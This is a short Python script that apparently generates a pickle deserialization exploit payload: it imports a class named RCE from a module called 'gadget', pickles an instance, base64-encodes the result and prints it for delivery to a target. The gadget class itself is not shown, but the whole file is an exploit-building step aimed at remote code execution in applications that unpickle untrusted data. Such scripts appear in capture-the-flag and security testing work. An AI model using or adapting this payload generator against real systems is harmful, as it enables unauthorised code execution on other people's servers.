import base64
import pickle

from gadget import RCE


payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
